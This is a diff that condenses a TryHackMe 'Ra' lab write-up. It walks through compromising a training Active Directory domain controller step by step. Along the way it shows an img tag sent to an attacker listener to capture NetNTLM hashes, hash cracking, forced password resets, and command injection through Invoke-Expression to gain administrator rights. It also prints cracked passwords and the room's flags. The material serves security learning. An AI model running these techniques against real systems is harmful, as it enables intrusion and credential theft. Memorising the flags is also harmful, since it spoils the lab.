@@ -1,43 +1,29 @@
-# TryHackMe — Ra: Writeup
+# TryHackMe — Ra
 
-**Room:** Ra  
-**Difficulty:** Hard  
-**Infrastructure:** Active Directory / Windows Server 2019  
-**Made by:** @4nqr34z and @theart42
-
----
-
-## ![Local Image](./assets/ra.png)
+**Room:** Ra | **Difficulty:** Hard | **OS:** Windows Server 2019 / Active Directory
+**Authors:** @4nqr34z and @theart42
+**Tags:** `Active Directory` `OSINT` `XMPP` `CVE-2020-12772` `NetNTLM` `Responder` `BloodHound` `GenericAll` `Invoke-Expression` `eCPPT` `CRTP`
 
 ---
 
-> **A note before we start:** You might find this writeup longer than the typical "run these commands, get root" format and that is **intentional**.
->
-> I shared my full **black-box methodology** as I am learning, including the **dead ends**, the **rabbit holes**, and the **reasoning behind every decision**.
->
-> If you are prepping for something like the eCPPT or CRTP, that mindset matters as much as the commands themselves.
+## ![Room Banner](./assets/ra.png)
 
-## Context
+---
 
-_You have gained access to the internal network of WindCorp, a multibillion dollar company running an extensive social media campaign claiming to be unhackable. The goal is to take their crown jewels full access to their internal network starting from a single exposed Windows machine._
+## Overview
+
+A multi-stage Active Directory engagement against WindCorp — a single Windows Server 2019 Domain Controller running a mix of standard AD services and a third-party XMPP messaging stack (Openfire + Spark). The attack chain progresses from web OSINT and password reset abuse, through a CVE-based XMPP hash capture, to a BloodHound-mapped ACL exploit and scheduled task injection — no direct AD attack path, all lateral thinking.
 
 ---
 
 ## Phase 1 — Reconnaissance
 
-### Start with Nmap
+### Nmap Full-Port Scan
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ nmap -Pn -A -T4 -vv 10.112.176.170 -oN nmap.txt
 ```
-
-Briefly on the flags :
-
-- `-A` Enables aggressive mode: OS and Version detection and Script scanning all in one.
-- `-T4` Aggressive timing for faster results while maintaining scan reliability.
-
-And always save your scans with `-oN` , you will want to grep through them later.
 
 ```
 PORT      STATE SERVICE            VERSION
@@ -73,40 +59,31 @@ Host Script Results:
 |_  Product_Version: 10.0.17763 (Windows Server 2019)
 ```
 
-The presence of DNS (53), Kerberos (88), and LDAP (389, 636, 3268, 3269) confirm this is a Domain Controller. LDAP and RDP leak the domain and hostname: `windcorp.thm` and `FIRE`.
+**Key takeaways:** Standard DC stack confirmed (Kerberos/88, LDAP/389, Global Catalog/3268). RDP NTLM banner leaks domain `windcorp.thm` and hostname `FIRE`. SMB signing is enforced, ruling out relay attacks.
 
-While the standard AD services were expected, the presence of Openfire on ports 5222, 7070, and 7443 immediately stood out.
+The non-standard services are the high-value targets: **Openfire XMPP** on ports 5222, 7070, and 7443, with its admin console on **9090**. This is a corporate messaging platform — a significant attack surface that will become central to the engagement.
 
-Openfire is an open-source XMPP server. Essentially a private, corporate third-party app like Slack or WhatsApp. Its admin console sits on port 9090. We'll circle back to this later.
-
-Immediately adding `10.112.176.170 windcorp.thm FIRE.windcorp.thm` to `/etc/hosts`.
+```
+10.112.176.170 windcorp.thm FIRE.windcorp.thm
+```
 
 ---
 
 ## Phase 2 — SMB & LDAP Enumeration
 
-With the scan results ready, I checked for "low-hanging fruit" like Anonymous Logins and Null Sessions. In AD, these are the fastest ways to leak valid usernames.
-
-I started with `smbclient`, but Windows Server 2019 often rejects legacy protocols. After a few mismatches, I had to specify the protocol version explicitly:
-
-Trying a null session with smbclient:
+### Null Session Probe
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ smbclient -L //10.112.176.170/ -N --option='client min protocol=SMB3'
 
 Anonymous login successful
-
         Sharename       Type      Comment
         ---------       ----      -------
 SMB1 disabled -- no workgroup available
 ```
 
-The login was "successful," but the server refused to enumerate shares. The front door was unlocked, but a secondary gate blocked the view.
-
-I switched to `crackmapexec` to get a clearer picture of what was actually allowed:
-
-Since the Domain Controller allowed the Null Session I tried to enumerate Shares but didn't work:
+Anonymous bind succeeds but share listing is blocked. CrackMapExec confirms the same wall via the SAMR/RPC path:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -116,18 +93,6 @@ SMB  10.112.176.170  445  FIRE  [*] Windows 10 / Server 2019 Build 17763 x64 (na
 SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\:
 SMB  10.112.176.170  445  FIRE  [-] Error enumerating shares: STATUS_ACCESS_DENI
 ```
-
-Key takeaways:
-
-- **Null Auth:** True — we can bind without a password.
-- **Signing:** True — no NTLM relay attacks are possible.
-- **The Reality:** Even with a successful null auth, `--shares` returns `ACCESS_DENIED`.
-
-I also checked RDP, WinRM, and LDAP for anonymous access. WinRM and RDP returned `STATUS_LOGON_FAILURE`, and LDAP required a successful bind for deeper enumeration.
-
-### Time to try enum4linux-ng
-
-`-A` to enumerate everything:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -144,23 +109,7 @@ I also checked RDP, WinRM, and LDAP for anonymous access. WinRM and RDP returned
 [-] Policy Info: STATUS_ACCESS_DENIED
 ```
 
-The DC is heavily hardened with SMB signing required. All direct user/share enumeration returns `STATUS_ACCESS_DENIED`, forcing a pivot to a different entry point.
-
-### One Final Thing — LDAP
-
-My previous attempt to use `nxc` for an automated LDAP sweep hit a wall:
-
-```bash
-┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ nxc ldap 10.112.176.170 -u '' -p ''
-
-LDAP  10.112.176.170  389  FIRE  [-] operationsError: 000004DC: LdapErr: DSID-0C
-LDAP  10.112.176.170  389  FIRE  [+] windcorp.thm\:
-```
-
-The DC prevents high-level unauthenticated searches, but a "successful bind" doesn't always require a password — just formal identification. Let's go lower level:
-
-I decided to use `ldapsearch` directly to query the Naming Contexts just to confirm from nmap what we are working with:
+### LDAP Naming Context Confirmation
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -174,11 +123,9 @@ namingcontexts: DC=ForestDnsZones,DC=windcorp,DC=thm
 namingcontexts: DC=DomainDnsZones,DC=windcorp,DC=thm
 ```
 
-We successfully pulled the Naming Contexts. This confirms the internal structure of the `windcorp.thm` forest and gives us the exact Base DN we need for any deeper authenticated enumeration later.
+Single-domain forest confirmed: `windcorp.thm`. Base DN established for any subsequent authenticated LDAP queries.
 
-### Kerbrute for Username Enumeration
-
-Later I tried to enumerate users with Kerbrute but apart from the default names like Administrator and fire (machine account) I didn't find much:
+### Kerbrute
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -188,15 +135,13 @@ Later I tried to enumerate users with Kerbrute but apart from the default names 
 [+] VALID USERNAME: administrator@windcorp.thm
 ```
 
-Okay, enough for external network enumeration. The AD structure is gatekeeping sensitive data, so it's time to pivot. Let's interact with the web services discovered earlier.
+Only default accounts surface from wordlist enumeration. AD is properly locked down externally — pivot to the web services.
 
 ---
 
-## Phase 3 — Web Enumeration (Port 80)
+## Phase 3 — Web Enumeration & OSINT (Port 80)
 
-### Let's Start with Port 80 IIS
-
-First, I used `ffuf` to perform two types of discovery: Directory Fuzzing and VHost Enumeration:
+### Directory and VHost Fuzzing
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -206,46 +151,29 @@ First, I used `ffuf` to perform two types of discovery: Directory Fuzzing and VH
 └─$ ffuf -u http://10.112.176.170 -H "Host: FUZZ.windcorp.thm" -w /usr/share/sec...
 ```
 
-Fuzzing for directories returned only standard files like `index.html` and inaccessible folders.
+Directory fuzzing yields only standard IIS files. VHost enumeration produces only false positives even after size-filtering. No hidden subdomains discovered.
 
-VHost enumeration produced a flood of false positives, and even after filtering by response size (`-fs 11334`) to kill the noise, no hidden subdomains or unique web surfaces were discovered.
-
-### Let's Jump Into the Website
+### Website OSINT — Two Critical Findings
 
 ![Local Image](./assets/1.png)
 
-The main WindCorp site looks interesting, especially the "Reset Password" button at the top.
-
-Clicking it opens a new tab at `http://fire.windcorp.thm/reset.asp` with a username field and some security questions.
+The WindCorp site hosts a **"Reset Password"** link resolving to `http://fire.windcorp.thm/reset.asp`, presenting a username field and security questions.
 
 ![Local Image](./assets/2.png)
 
-Okay, let's go back to the website first.
-
-While scrolling through the site, I identified a search bar and immediately tested it for common injection flaws:
-
-- XSS (`<script>alert(1)</script>`)
-- SQLi (`' OR 1=1--`)
-- LFI (`../../../../windows/win.ini`)
-- OS Command Injection (`test; whoami`)
-
-Unfortunately nothing stood out.
-
-On the website, I also discovered a list of IT support staff and several employees with profile pictures.
+Scrolling through the employee listing, one entry stands out: **Lily Levesque**, whose profile photo shows her holding a dog — directly relevant to the security question _"What is/was your favorite pet's name?"_
 
 ![Local Image](./assets/3.png)
 
 ![Local Image](./assets/4.png)
 
-One stood out (**Lily Levesque**) because the image features the employee holding her dog which immediately reminded me of the reset password security question: _"What is/was your favorite pet's name?"_ I examined the page source with `Ctrl+U` to dig deeper.
-
-Diving into the source code paid off immediately. Two critical pieces of intelligence:
+Inspecting the page source (`Ctrl+U`) reveals two intelligence wins:
 
 #### 1. Leaked XMPP JIDs
 
 ![Local Image](./assets/5.png)
 
-The employee list is not just static text, it is pulling live status icons from the Openfire server on port 9090. This leaked many JIDs which are almost certainly User Principal Names (UPNs):
+The employee directory pulls live presence icons from the Openfire server on port 9090. This inadvertently exposes Jabber IDs (JIDs) that map directly to domain UPNs:
 
 ```
 organicfish718@fire
@@ -255,29 +183,27 @@ happyelephant792
 ...
 ```
 
-I saved these to a `users.txt` file immediately for AS-REP Roasting later.
+These are saved immediately to `users.txt` for downstream enumeration.
 
-#### 2. The Photo Filename
+#### 2. Username and Pet Name via Image Filename
 
 ![Local Image](./assets/6.png)
 
-The profile picture I spotted earlier has a very revealing filename: `lilyleAndSparky.jpg` which hints the user's name is `lilyle` and her dog's name is `Sparky`.
+Lily's profile image filename is `lilyleAndSparky.jpg` — revealing her username (`lilyle`) and her dog's name (`Sparky`).
 
-Jumping back to the reset password page: enter `lilyle` and `Sparky`, and we get a new password for `lilyle`.
+Entering `lilyle` / `Sparky` into the password reset form succeeds and resets her account to a known password.
 
 ![Local Image](./assets/7.png)
 
 ---
 
-## Phase 4 — Openfire Rabbit Hole (CVE-2023–32315)
+## Phase 4 — Openfire CVE-2023-32315 (Rabbit Hole)
 
-Going to the previously discovered web page on port 9090, it is the Openfire Administration Login page. I tried the `lilyle` credentials but they did not work.
+The admin console at port 9090 presents an Openfire login page. `lilyle`'s credentials fail here.
 
 ![Local Image](./assets/8.png)
 
-Okay, here I got into a rabbit hole trying to find a vulnerability for the leaked version Openfire 4.5.1
-
-Doing some research I found there is a vulnerability for Openfire 4.5.1: CVE-2023-32315 so I tried to exploit it with Metasploit:
+Openfire 4.5.1 is vulnerable to CVE-2023-32315 (authentication bypass + RCE). Attempted via Metasploit:
 
 ```
 msf exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > check
@@ -292,15 +218,13 @@ msf exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > exploit
 [*] Exploit completed, but no session was created.
 ```
 
-Here I wasted so much time. The exploit created the user but could not authenticate with it.
-
-The lesson: version matching a CVE is a starting point, not a guarantee. I decided to move on.
+The user was created but authentication failed — likely a patched or partially mitigated deployment. Version matching a CVE is a starting point, not a guarantee. Moving on.
 
 ---
 
-## Phase 5 — Building a Valid User List & AS-REP Roasting
+## Phase 5 — Username Validation, AS-REP Roasting & Share Enumeration
 
-Next I checked the previously found users list with Kerbrute:
+### Kerbrute Against Harvested JIDs
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -322,7 +246,7 @@ Next I checked the previously found users list with Kerbrute:
 [+] VALID USERNAME: happymeercat399@windcorp.thm
 ```
 
-Great — this confirms these are indeed real UPNs in the domain. So immediately I checked `lilyle`'s creds with CrackMapExec:
+XMPP JIDs confirmed as valid domain UPNs. Validating `lilyle`:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -331,25 +255,7 @@ Great — this confirms these are indeed real UPNs in the domain. So immediately
 SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\lilyle:ChangeMe#1234
 ```
 
-This confirms the creds for `lilyle` but no `Pwn3d!` — so this is probably a standard domain user.
-
-Since WinRM is open I checked for WinRM access, but no privilege there:
-
-```bash
-┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ crackmapexec winrm 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234'
-
-WINRM  10.112.176.170  5985  FIRE  [-] windcorp.thm\lilyle:ChangeMe#1234
-```
-
-Then I tested RDP to get a foothold but that also failed:
-
-```bash
-┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ xfreerdp /v:10.112.176.170 /u:lilyle /p:'ChangeMe#1234' /d:windcorp.thm /dyn...
-```
-
-To confirm RDP denial was not a bug, I listed the members of Remote Desktop Users:
+Valid — standard domain user. WinRM and RDP both deny access. Group inspection confirms only the `IT` group has RDP rights, and `lilyle` is not a member.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -357,8 +263,6 @@ To confirm RDP denial was not a bug, I listed the members of Remote Desktop User
 
 SMB  10.112.176.170  445  FIRE  windcorp.thm\IT
 ```
-
-Unfortunately `lilyle` is not a member of the IT group:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -390,13 +294,9 @@ SMB  10.112.176.170  445  FIRE  windcorp.thm\blackrabbit511
 SMB  10.112.176.170  445  FIRE  windcorp.thm\bluefrog579
 ```
 
-**Important notice:**  
-Since we lack administrative privileges, we cannot write to `ADMIN$` or `C$`, which takes `psexec.py` and `wmiexec.py` completely off the table.  
-We can map the domain with BloodHound but still cannot privesc or lateral move from here.
+`buse` is a confirmed IT group member — a lateral movement target.
 
-### Another Thing We Can Do — AS-REP Roasting
-
-I dumped all domain users with `lilyle` and checked if any are AS-REP roastable:
+### AS-REP Roasting & Kerberoasting
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -408,19 +308,15 @@ I dumped all domain users with `lilyle` and checked if any are AS-REP roastable:
 # [-] User X doesn't have UF_DONT_REQUIRE_PREAUTH set (for all 900+ accounts)
 ```
 
-Unfortunately no user is AS-REP roastable.
-
-Then I tried looking for accounts with SPNs for Kerberoasting:
-
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ impacket-GetUserSPNs windcorp.thm/lilyle:'ChangeMe#1234' -dc-ip 10.112.176.1...
 # No entries found!
 ```
 
-Not a single service account? Okay!
+No AS-REP roastable accounts across 900+ users, and no SPNs registered. The Kerberos attack surface is closed.
 
-### Now I Moved On Into SMB Shares
+### SMB Shares — Flag 1 and a Key Artefact
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -435,8 +331,6 @@ Shared      READ
 SYSVOL      READ         Logon server share
 Users       READ
 ```
-
-We have plenty of shares to read. Using `smbclient`:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -456,49 +350,40 @@ smb: \> get spark_2_8_3.deb
 
 **Flag 1:** `THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}`
 
+The presence of Spark installation packages in a company share confirms the domain is actively running this XMPP client — and gives us the exact version to research.
+
 ---
 
-## Phase 6 — CVE-2020–12772: Spark XMPP → NetNTLM Hash Capture
-
-Previous nmap confirms an internal messaging ecosystem: Openfire (XMPP) on ports 5222 and 7070, with the management console on 9090.
-
-Having the Spark installation package in the Shared share confirms the domain is actively using this third-party messaging app.
+## Phase 6 — CVE-2020-12772: Spark XMPP → NetNTLM Hash Capture
 
 ### Installing Spark
 
-First I tried to install the package from the share, but it seems old and does not run on my Kali rolling release version.
-
-So I installed the latest stable package from the official site: https://www.igniterealtime.org/projects/spark/
+The shared package is outdated and does not run on a current Kali install. Install the latest stable release instead:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ sudo dpkg -i ~/Downloads/spark_3_0_2.deb
 ```
 
-When opening the app we can authenticate as Lily Levesque with `ChangeMe#1234` on `10.112.176.170`.
+Authenticate as `lilyle` with `ChangeMe#1234` on `10.112.176.170`.
 
 ![Local Image](./assets/9.png)
 
-**Important note:**  
-In the Advanced options under the Certificates tab, enable both **Accept self-signed** and **Accept expired**. The Openfire server uses a self-signed certificate, and Spark will refuse the connection otherwise.
+> **Note:** In Advanced options → Certificates tab, enable **Accept self-signed** and **Accept expired**. The Openfire server uses a self-signed certificate and Spark will refuse the connection otherwise.
 
 ![Local Image](./assets/10.png)
 
-### The Vulnerability — CVE-2020–12772
+### The Vulnerability — CVE-2020-12772
 
-Doing some research and looking for vulnerabilities on this third-party app, I landed on CVE-2020-12772.
+CVE-2020-12772 is an HTML injection flaw in Spark's chat renderer. When a message containing an `<img>` tag is rendered, the client fetches the image source using Windows' native HTTP stack — triggering an automatic NTLM authentication attempt against the attacker's listener.
 
-source: https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
-
-Basically when we open a chat with another user, we can send an `<img>` tag with our IP as the image source:
+Source: https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
 
 ```html
 <img src=http://YOUR_TUN0_IP/test.img>
 ```
 
-Each time the target's client or the ROAR module pre-loads the link, it authenticates via the Windows stack. This leaks the NetNTLM challenge-response hash to whoever is listening.
-
-But first we need to target an active user. If you remember, on the website we have IT Support Staff **Buse** appearing with a green icon which hints she is the one currently logged in.
+The target is `buse` — identifiable as the active online user from the green presence indicator on the WindCorp website's IT staff listing.
 
 ![Local Image](./assets/11.png)
 
@@ -509,11 +394,9 @@ But first we need to target an active user. If you remember, on the website we h
 └─$ sudo responder -I tun0
 ```
 
-Now we send the payload to Buse Candan in Spark and wait:
+Send the payload to Buse Candan in Spark:
 
 ![Local Image](./assets/12.png)
-
-We got a catch!
 
 ```
 [+] Listening for events...
@@ -523,8 +406,7 @@ We got a catch!
 [*] Skipping previously captured hash for WINDCORP\buse
 ```
 
-**Important note:**  
-Remember — this is not an NTLM hash, this is a **NetNTLM challenge-response**. You cannot perform Pass-the-Hash with it. And since SMB signing is required on this DC, NTLM relay is also off the table. Your only move is to crack it offline.
+> **Important:** This is a **NetNTLMv2 challenge-response**, not an NTLM hash. Pass-the-Hash is not possible. NTLM relay is also off the table due to SMB signing. Offline cracking is the only viable path.
 
 ### Cracking the Hash
 
@@ -544,7 +426,7 @@ uzunLM+3131      (buse)
 Session completed.
 ```
 
-Password is `uzunLM+3131`.
+Password: `uzunLM+3131`
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -553,13 +435,11 @@ Password is `uzunLM+3131`.
 SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\buse:uzunLM+3131
 ```
 
-Not `Pwn3d!` — so not part of the domain admins group. But remember, Buse is a member of the IT group, so she has the privileges to use WinRM.
+Not `Pwn3d!` — but `buse` is an IT group member, granting WinRM access.
 
 ---
 
 ## Phase 7 — WinRM Foothold & Flag 2
-
-Using Evil-WinRM:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -579,13 +459,9 @@ d-----         5/7/2020   2:58AM                 Stuff
 
 **Flag 2:** `THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}`
 
-Now, mostly certain that Flag 3 is on the Administrator desktop, we need to find a way to privesc to administrator or `NT AUTHORITY\SYSTEM`.
+> The `Also stuff` and `Stuff` directories on Buse's desktop are rabbit holes — steganography dead ends.
 
-These folders on Buse's Desktop are rabbit holes by the way, do not waste time connecting the dots or trying steganography on the images inside them. Like I did (ㆆ \_ ㆆ).
-
-Moving on.
-
-### Further Enumeration — An Unusual Scripts Folder
+### Enumerating C:\ — A Non-Standard Scripts Directory
 
 ```bash
 *Evil-WinRM* PS C:\> ls
@@ -635,23 +511,15 @@ Do{
 } While ($true)
 ```
 
-The script acts like a Windows Scheduled Task. Here is what it does:
+**The flaw:** The script reads each line from `C:\Users\brittanycr\hosts.txt` and passes it **unsanitised** directly into `Invoke-Expression`. Any content placed into `hosts.txt` is executed as PowerShell — and the script runs with elevated privileges. This is a command injection primitive gated only by write access to `brittanycr`'s file.
 
-1. It reads a file at `C:\Users\brittanycr\hosts.txt`.
-2. It iterates through each line.
-3. **The flaw:** It takes each line and drops it raw into a string `$p`, which is then executed using `Invoke-Expression`.
-
-This script is probably running with admin or `NT AUTHORITY\SYSTEM` privileges to execute the commands in `brittanycr`'s `hosts.txt`. We can abuse it by injecting a payload into that file.
-
-But how can we do that? The file is owned by `brittanycr`, not by `buse`.
-
-We use BloodHound to map the domain and see what permissions we actually have over `brittanycr`.
+The obstacle: `hosts.txt` is owned by `brittanycr`, not `buse`. BloodHound will determine whether we have any ACL leverage over that account.
 
 ---
 
 ## Phase 8 — BloodHound + GenericAll → Domain Admin
 
-### Gathering Domain Data with bloodhound-python
+### Domain Data Collection
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -665,25 +533,21 @@ INFO: Found 6 ous
 INFO: Done in 00M 26S
 ```
 
-Start neo4j:
-
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ sudo neo4j start
 ```
-
-Open BloodHound:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
 ```
 
-Upload the data, mark `buse` as owned, and look for the Shortest Path to `brittanycr` from owned principals.
+Upload the data, mark `buse` as owned, and query the shortest path from owned principals to `brittanycr`.
 
 ![Local Image](./assets/13.png)
 
-We find that we have **GenericAll** permission over `brittanycr` — which means basically full control of that user object. We can force change her password.
+`buse` holds **GenericAll** over `brittanycr` — full control of that user object, including the ability to force a password reset.
 
 ![Local Image](./assets/14.png)
 
@@ -696,20 +560,16 @@ We find that we have **GenericAll** permission over `brittanycr` — which means
 └─$ net rpc password "brittanycr" "P@ssw0rd123" -U "windcorp.thm"/"buse"%"uzunLM+3131" -S 10.112.176.170
 ```
 
-Now we pwned `brittanycr` we can access and modify the `hosts.txt` content on the Users share.
+### Payload Injection via hosts.txt
 
-### Injecting the Payload
-
-We first create the payload.
-
-Note: don't forget the `;` to start the new payload.
+Construct the command injection payload. The leading `;` terminates the `Test-Connection` argument and begins a new PowerShell statement:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ echo "; net localgroup Administrators buse /add" > hosts.txt
 ```
 
-Then upload it:
+Upload via SMB authenticated as the now-controlled `brittanycr`:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -720,9 +580,9 @@ smb: \brittanycr\> put hosts.txt
 putting file hosts.txt as \brittanycr\hosts.txt (0.4 kB/s)
 ```
 
-Now as a consequence if the payload loads with high privileges, `buse` becomes a member of the local Administrators group.
+When `checkservers.ps1` next executes (running as a privileged context), it reads the injected line and runs `net localgroup Administrators buse /add` — elevating `buse` to local Administrator.
 
-### Check
+### Confirming Escalation
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -731,11 +591,11 @@ Now as a consequence if the payload loads with high privileges, `buse` becomes a
 SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
 ```
 
-**Pwn3d! domain admin confirmed.**
+Domain compromised.
 
 ---
 
-## Phase 9 — Grabbing the Final Flag
+## Phase 9 — Final Flag
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -756,18 +616,34 @@ Mode                LastWriteTime         Length Name
 
 ---
 
-## Closing Thoughts
+## Attack Chain Summary
 
-In my journey for the eCPPT and CRTP prep, I found this room very helpful and rich. It covers a realistic multi-stage attack chain that does not hand you anything — **web OSINT**, **XMPP protocol abuse**, **Active Directory permissions exploitation**, and **scheduled task injection** all chained together.
-
-That kind of cross-domain thinking is exactly what those certifications test, and what real engagements look like.
-
-As I said before, I did not just put a list of successful commands to pwn this box. I shared my thinking methodology as I am learning.
-
-I hope you found it helpful.
-
-Thanks for reading!
+| Phase                  | Technique                            | Outcome                                            |
+| ---------------------- | ------------------------------------ | -------------------------------------------------- |
+| Reconnaissance         | Nmap full-port scan                  | DC topology, Openfire XMPP stack identified        |
+| SMB/LDAP Enum          | Null session probing                 | Domain structure confirmed, access blocked         |
+| Web OSINT              | Page source analysis, image filename | XMPP JID list, `lilyle` username + pet name        |
+| Password Reset Abuse   | Security question answer             | Valid credentials for `lilyle`                     |
+| CVE-2023-32315         | Openfire auth bypass                 | Unsuccessful — patched deployment                  |
+| AS-REP / Kerberoasting | GetNPUsers, GetUserSPNs              | No vulnerable accounts                             |
+| CVE-2020-12772         | Spark XMPP HTML injection            | NetNTLMv2 hash captured for `buse`                 |
+| Hash Cracking          | John the Ripper (rockyou)            | `buse` password recovered                          |
+| WinRM Access           | Evil-WinRM                           | Interactive shell, Flag 2                          |
+| Script Analysis        | `checkservers.ps1` review            | `Invoke-Expression` injection primitive identified |
+| BloodHound             | ACL mapping                          | `buse` → GenericAll → `brittanycr`                 |
+| GenericAll Abuse       | Forced password reset                | Write access to `brittanycr`'s files               |
+| Command Injection      | `hosts.txt` payload                  | `buse` added to local Administrators, Flag 3       |
 
 ---
 
-**Tags:** TryHackMe · Active Directory · Red Team · Openfire · XMPP · NetNTLM · Responder · BloodHound · GenericAll · Invoke-Expression · eCPPT · CRTP
+## Key Takeaways
+
+The initial access chain here demonstrates how information leaks compound across seemingly unrelated systems. A corporate website's live presence integration with an XMPP server leaked a full user list. An image filename on a public-facing page yielded both a username and a security question answer. Neither of these required any active exploitation — both were read-only OSINT against the application layer.
+
+The CVE-2020-12772 exploit is mechanically straightforward but illustrates a broader principle: Windows' automatic NTLM authentication can be triggered by any application that renders user-controlled content containing URLs. The client doesn't need to be a browser. Any app that fetches a resource from an attacker-controlled host will hand over a NetNTLMv2 hash — the only question is whether that hash is crackable.
+
+The final escalation chain — GenericAll → forced password reset → `Invoke-Expression` injection — highlights how AD ACL misconfigurations and poorly written scheduled tasks interact. Neither vulnerability is exploitable alone without the BloodHound-mapped path connecting them.
+
+---
+
+**Tags:** `TryHackMe` `Active Directory` `OSINT` `XMPP` `CVE-2020-12772` `CVE-2023-32315` `NetNTLM` `Responder` `BloodHound` `GenericAll` `Invoke-Expression` `Evil-WinRM` `eCPPT` `CRTP`
